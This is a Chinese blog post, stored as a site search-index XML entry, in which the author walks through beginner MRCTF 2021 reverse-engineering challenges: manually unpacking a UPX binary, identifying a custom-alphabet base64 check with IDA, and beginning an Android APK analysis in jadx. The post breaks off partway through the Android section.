<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF入门题</title>
    <url>/2021/04/11/CTF%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="CTF入门题"><a href="#CTF入门题" class="headerlink" title="CTF入门题"></a>CTF入门题</h1><p>昨天下午在宿舍没有太多事做，就在耍手机，有个朋友说他参加了个CTF比赛，但是逆向的题目不太会，想找我帮忙看看，我正想着反正也没啥事，而且他说参加的是MRCTF，一个青少年的CTF比赛，这类的题目应该是十分钟一个的，并且他给我发的说还是入门题目，我就想着多多少少帮忙看看吧，故事就开始了。</p>
<h2 id="exe逆向"><a href="#exe逆向" class="headerlink" title="exe逆向"></a>exe逆向</h2><p>搞exe逆向我自认为已经是快到头了（自认为的），就想着快点搞完，他就给我发过来了，用查壳的一查是个UPX的，手头没有脱壳机，我就手拖一下吧。<br><img src="1.jpg" alt="exe"><br>可以看到是一个大跳转，然后一直跟下去，发现貌似是加花混淆了的，而且处在ntdll里面，那么就没啥好说的了，直接无脑到返回，这个时候OD一直显示在nt，直到出现打印了一个提示信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome to MRCTF 2021, wish you can catch the flag</span><br><span class="line">Please input your flag:</span><br></pre></td></tr></table></figure>
<p><img src="2.jpg" alt="exe"><br>然后整个程序就看到了00401751这个应该就是入口，直接就可以拖出来了，没啥太大的难度，然后想了一下是算法题，就直接用IDA打开就好，用OD反倒是没啥意思。<br>然后进去看main函数，大致上是这样子的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+14h] [ebp-53Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+15h] [ebp-53Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+16h] [ebp-53Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+17h] [ebp-539h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+18h] [ebp-538h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+19h] [ebp-537h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+1Ah] [ebp-536h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+1Bh] [ebp-535h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+1Ch] [ebp-534h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+1Dh] [ebp-533h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [esp+1Eh] [ebp-532h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+1Fh] [ebp-531h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+20h] [ebp-530h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+21h] [ebp-52Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+22h] [ebp-52Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+23h] [ebp-52Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+24h] [ebp-52Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+25h] [ebp-52Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+26h] [ebp-52Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+27h] [ebp-529h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+28h] [ebp-528h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+29h] [ebp-527h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+2Ah] [ebp-526h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [esp+2Bh] [ebp-525h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+2Ch] [ebp-524h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+2Dh] [ebp-523h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [esp+2Eh] [ebp-522h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [esp+2Fh] [ebp-521h]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [esp+30h] [ebp-520h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [esp+31h] [ebp-51Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [esp+32h] [ebp-51Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [esp+33h] [ebp-51Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [esp+34h] [ebp-51Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [esp+35h] [ebp-51Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [esp+36h] [ebp-51Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [esp+37h] [ebp-519h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+38h] [ebp-518h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+39h] [ebp-517h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [esp+3Ah] [ebp-516h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [esp+3Bh] [ebp-515h]</span></span><br><span class="line">  <span class="keyword">char</span> v41; <span class="comment">// [esp+3Ch] [ebp-514h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [esp+3Dh] [ebp-513h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [esp+3Eh] [ebp-512h]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [esp+3Fh] [ebp-511h]</span></span><br><span class="line">  <span class="keyword">char</span> Str; <span class="comment">// [esp+40h] [ebp-510h]</span></span><br><span class="line">  <span class="keyword">char</span> v46[<span class="number">1024</span>]; <span class="comment">// [esp+140h] [ebp-410h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v47; <span class="comment">// [esp+540h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v48; <span class="comment">// [esp+544h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v49; <span class="comment">// [esp+548h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+54Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402290();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to MRCTF 2021, wish you can catch the flag"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;Str);</span><br><span class="line">  v49 = &amp;Str;</span><br><span class="line">  v48 = <span class="built_in">strlen</span>(&amp;Str);</span><br><span class="line">  v47 = sub_401500(v49, v48, v46);</span><br><span class="line">  v46[v47] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">116</span>;</span><br><span class="line">  v2 = <span class="number">118</span>;</span><br><span class="line">  v3 = <span class="number">106</span>;</span><br><span class="line">  v4 = <span class="number">100</span>;</span><br><span class="line">  v5 = <span class="number">118</span>;</span><br><span class="line">  v6 = <span class="number">101</span>;</span><br><span class="line">  v7 = <span class="number">122</span>;</span><br><span class="line">  v8 = <span class="number">55</span>;</span><br><span class="line">  v9 = <span class="number">68</span>;</span><br><span class="line">  v10 = <span class="number">48</span>;</span><br><span class="line">  v11 = <span class="number">118</span>;</span><br><span class="line">  v12 = <span class="number">83</span>;</span><br><span class="line">  v13 = <span class="number">121</span>;</span><br><span class="line">  v14 = <span class="number">90</span>;</span><br><span class="line">  v15 = <span class="number">98</span>;</span><br><span class="line">  v16 = <span class="number">110</span>;</span><br><span class="line">  v17 = <span class="number">122</span>;</span><br><span class="line">  v18 = <span class="number">118</span>;</span><br><span class="line">  v19 = <span class="number">57</span>;</span><br><span class="line">  v20 = <span class="number">48</span>;</span><br><span class="line">  v21 = <span class="number">109</span>;</span><br><span class="line">  v22 = <span class="number">102</span>;</span><br><span class="line">  v23 = <span class="number">57</span>;</span><br><span class="line">  v24 = <span class="number">110</span>;</span><br><span class="line">  v25 = <span class="number">117</span>;</span><br><span class="line">  v26 = <span class="number">75</span>;</span><br><span class="line">  v27 = <span class="number">110</span>;</span><br><span class="line">  v28 = <span class="number">117</span>;</span><br><span class="line">  v29 = <span class="number">114</span>;</span><br><span class="line">  v30 = <span class="number">76</span>;</span><br><span class="line">  v31 = <span class="number">56</span>;</span><br><span class="line">  v32 = <span class="number">89</span>;</span><br><span class="line">  v33 = <span class="number">66</span>;</span><br><span class="line">  v34 = <span class="number">90</span>;</span><br><span class="line">  v35 = <span class="number">105</span>;</span><br><span class="line">  v36 = <span class="number">88</span>;</span><br><span class="line">  v37 = <span class="number">105</span>;</span><br><span class="line">  v38 = <span class="number">115</span>;</span><br><span class="line">  v39 = <span class="number">101</span>;</span><br><span class="line">  v40 = <span class="number">72</span>;</span><br><span class="line">  v41 = <span class="number">70</span>;</span><br><span class="line">  v42 = <span class="number">113</span>;</span><br><span class="line">  v43 = <span class="number">61</span>;</span><br><span class="line">  v44 = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v47; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v46[i] != *(&amp;v1 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Sorry, plz try again"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Jesus, You are so handsome!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的给出了一个加密之后的字符，但是出题人为了防止搜索字符串时候直接看到加密的内容，用这种比较麻烦的方法进行了小的保护，将那一长串的赋值进行编码之后是这样子的一个东西：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tvjdvez7D0vSyZbozv90mf9nuKnurL8YBZiXiseHFq&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>这个让谁都会想到是base64，然后去网站解码一下发现出错了，这个时候我的傻子行为就开始了，简单阅读这段代码，发现<code>sub_401500</code>这个函数是我们的加密函数，就需要跟进去，然后代码就能看到了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401500</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v17 + <span class="number">3</span> &lt;= a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v15;</span><br><span class="line">    v4 = v15 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v3 + a3) = byte_403040[(<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v17) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5 = v4++;</span><br><span class="line">    *(_BYTE *)(v5 + a3) = byte_403040[<span class="number">16</span> * *(_BYTE *)(a1 + v17) &amp; <span class="number">0x30</span> | ((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v17 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">    *(_BYTE *)(v4 + a3) = byte_403040[<span class="number">4</span> * *(_BYTE *)(v17 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span> | ((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v17 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">    v6 = v4 + <span class="number">1</span>;</span><br><span class="line">    v15 = v4 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a3) = byte_403040[*(_BYTE *)(v17 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v17 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v17 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - v17 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v15;</span><br><span class="line">      v8 = v15 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + a3) = byte_403040[(<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v17) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      *(_BYTE *)(v8 + a3) = byte_403040[<span class="number">16</span> * *(_BYTE *)(a1 + v17) &amp; <span class="number">0x30</span>];</span><br><span class="line">      v9 = v8 + <span class="number">1</span>;</span><br><span class="line">      v16 = v8 + <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(a3 + v9) = <span class="number">61</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = v15;</span><br><span class="line">      v12 = v15 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v11 + a3) = byte_403040[(<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v17) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      *(_BYTE *)(v12 + a3) = byte_403040[<span class="number">16</span> * *(_BYTE *)(a1 + v17) &amp; <span class="number">0x30</span> | ((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v17 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">      v13 = v12 + <span class="number">1</span>;</span><br><span class="line">      v16 = v12 + <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v13 + a3) = byte_403040[<span class="number">4</span> * *(_BYTE *)(v17 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v16;</span><br><span class="line">    v15 = v16 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a3 + v10) = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我就开始分析了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_BYTE *)(v3 + a3) = byte_403040[(<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v17) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">v5 = v4++;</span><br><span class="line">*(_BYTE *)(v5 + a3) = byte_403040[<span class="number">16</span> * *(_BYTE *)(a1 + v17) &amp; <span class="number">0x30</span> | ((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v17 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">*(_BYTE *)(v4 + a3) = byte_403040[<span class="number">4</span> * *(_BYTE *)(v17 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span> | ((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v17 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">v6 = v4 + <span class="number">1</span>;</span><br><span class="line">v15 = v4 + <span class="number">2</span>;</span><br><span class="line">*(_BYTE *)(v6 + a3) = byte_403040[*(_BYTE *)(v17 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br></pre></td></tr></table></figure>
<p>这段是将三个字符转化为4个字符，然后进行了一些位值操作，我就用C复现了一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x&lt;&lt;<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">two</span> <span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> r = (((y * <span class="number">16</span>) &amp; <span class="number">0x30</span>) | (i &gt;&gt; <span class="number">4</span>));</span><br><span class="line">		<span class="comment">//printf("r:%d\n",r);</span></span><br><span class="line">		<span class="keyword">if</span>(r == x)&#123;</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,one(<span class="number">52</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,two(<span class="number">3</span>,one(<span class="number">52</span>)));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,<span class="number">0x31</span> &gt;&gt; <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,((<span class="number">0x34</span> * <span class="number">16</span>) &amp; <span class="number">0x30</span>)  | (<span class="number">0x35</span> &gt;&gt; <span class="number">4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,((<span class="number">0x32</span> * <span class="number">4</span>) &amp; <span class="number">0x3c</span>)  | (<span class="number">0x33</span> &gt;&gt; <span class="number">6</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,<span class="number">0x33</span> &amp; <span class="number">0x3F</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%c\n"</span>,a[<span class="number">0x31</span> &gt;&gt; <span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%c\n"</span>,a[((<span class="number">0x31</span> * <span class="number">16</span>) &amp; <span class="number">0x30</span>)  | (<span class="number">0x32</span> &gt;&gt; <span class="number">4</span>)]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%c\n"</span>,a[((<span class="number">0x32</span> * <span class="number">4</span>) &amp; <span class="number">0x3c</span>)  | (<span class="number">0x33</span> &gt;&gt; <span class="number">6</span>)]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%c"</span>,a[<span class="number">0x33</span> &amp; <span class="number">0x3F</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读这段加密函数的时候里面的<code>byte_403040</code>就是我上面的a字符串，到这个时候我还没有想到要换码表，只是单纯的想把整个算法全部解出来。<br>我发现每三个一组，第二个值依靠于第三个值，第一个值只是一个移位，而且第二个值比较麻烦，我只能用到枚举方法进行解密，所以就有了我上面的<code>two</code>函数，然后手动枚举的时候发现出错了，然后测试了一个小时还是不对，到这个地方我就有点烦躁了，想一个签到题怎么会分析这么一个加密函数，会不会是一个成品的加密算法我不知道，到这个时候我还没想到是换表的base64，但是真的搞烦了，我就没继续做，晚上睡觉的时候觉得签到题没做出来真的太丢脸了，就又想了一下，后面有两个等号会是啥，突然想到应该是换表了，然后第二天就把他解出来了，确实好久没做了，感觉脑子有点跟不上了。<br>带一个网上搜索的换表代码吧：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span><span class="params">(inputs)</span>:</span></span><br><span class="line">	<span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">	bin_str = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">		x = str(bin(ord(i))).replace(<span class="string">'0b'</span>, <span class="string">''</span>)</span><br><span class="line">		bin_str.append(<span class="string">'&#123;:0&gt;8&#125;'</span>.format(x))</span><br><span class="line">	<span class="comment">#print(bin_str)</span></span><br><span class="line">	<span class="comment"># 输出的字符串</span></span><br><span class="line">	outputs = <span class="string">""</span></span><br><span class="line">	<span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">	nums = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> bin_str:</span><br><span class="line">		<span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">		temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line">		<span class="keyword">if</span>(len(temp_list) != <span class="number">3</span>):</span><br><span class="line">			nums = <span class="number">3</span> - len(temp_list)</span><br><span class="line">			<span class="keyword">while</span> len(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">				temp_list += [<span class="string">'0'</span> * <span class="number">8</span>]</span><br><span class="line">		temp_str = <span class="string">""</span>.join(temp_list)</span><br><span class="line">		<span class="comment">#print(temp_str)</span></span><br><span class="line">		<span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">		temp_str_list = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">			temp_str_list.append(int(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="comment">#print(temp_str_list)</span></span><br><span class="line">		<span class="keyword">if</span> nums:</span><br><span class="line">			temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">			outputs += s[i]</span><br><span class="line">		bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">	outputs += nums * <span class="string">'='</span></span><br><span class="line">	print(<span class="string">"Encrypted String:\n%s "</span>%outputs)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span><span class="params">(inputs)</span>:</span></span><br><span class="line">	<span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">	bin_str = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">		<span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">			x = str(bin(s.index(i))).replace(<span class="string">'0b'</span>, <span class="string">''</span>)</span><br><span class="line">			bin_str.append(<span class="string">'&#123;:0&gt;6&#125;'</span>.format(x))</span><br><span class="line">	<span class="comment">#print(bin_str)</span></span><br><span class="line">	<span class="comment"># 输出的字符串</span></span><br><span class="line">	outputs = <span class="string">""</span></span><br><span class="line">	nums = inputs.count(<span class="string">'='</span>)</span><br><span class="line">	<span class="keyword">while</span> bin_str:</span><br><span class="line">		temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">		temp_str = <span class="string">""</span>.join(temp_list)</span><br><span class="line">		<span class="comment">#print(temp_str)</span></span><br><span class="line">		<span class="comment"># 补足8位字节</span></span><br><span class="line">		<span class="keyword">if</span>(len(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">			temp_str = temp_str[<span class="number">0</span>:<span class="number">-1</span> * nums * <span class="number">2</span>]</span><br><span class="line">		<span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,int(len(temp_str) / <span class="number">8</span>)):</span><br><span class="line">			outputs += chr(int(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">		bin_str = bin_str[<span class="number">4</span>:]	</span><br><span class="line">	print(<span class="string">"Decrypted String:\n%s "</span>%outputs)</span><br><span class="line">	</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"     *************************************"</span>)</span><br><span class="line">print(<span class="string">"     *    (1)encode         (2)decode    *"</span>)	</span><br><span class="line">print(<span class="string">"     *************************************"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = input(<span class="string">"Please select the operation you want to perform:\n"</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">"1"</span>):</span><br><span class="line">	input_str = input(<span class="string">"Please enter a string that needs to be encrypted: \n"</span>)</span><br><span class="line">	My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	input_str = input(<span class="string">"Please enter a string that needs to be decrypted: \n"</span>)</span><br><span class="line">	My_base64_decode(input_str)</span><br></pre></td></tr></table></figure>

<h2 id="安卓入门题"><a href="#安卓入门题" class="headerlink" title="安卓入门题"></a>安卓入门题</h2><p>这个题目其实是在我没想到换表base64的时候他就发给我了，主要是我觉得入签到题没做出来有点丢脸，我就再要一个找回点面子，他就给我发来了安卓的一个签到题，用jadx打开看了一下，非常好，没有加壳，没有混淆，反调试我没看，但是应该也是没有的，那么这个题目就应该手到擒来了。</p>
<p>我用我的模拟器安装都提示失败了，其实实际上是我的安卓版本不够，他需要的sdk版本应该比较高，但是我又懒得再下载一个新的模拟器了，所以就直接静态分析吧，进来之后看到包很多，找到MainActivity，发现没有什么验证的东西，只是有这么一句代码：<code>editText2.addTextChangedListener(new MainActivity$onCreate$1(this, editText2, button, editText));</code>想了一下应该是输入框输入完之后才会允许点击，那就跟进去这个匿名内部类看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTextChanged</span><span class="params">(CharSequence charSequence, <span class="keyword">int</span> i, <span class="keyword">int</span> i2, <span class="keyword">int</span> i3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.$password.length() == <span class="number">39</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.$button.setEnabled(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.$button.setOnClickListener(<span class="keyword">new</span> MainActivity$onCreate$<span class="number">1</span>$onTextChanged$<span class="number">1</span>(<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.$button.setEnabled(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>确实是password等于39的时候才会允许点击按钮，所以说密码是39位，然后找到按钮点击的匿名内部类，看一下里面是啥：</p>
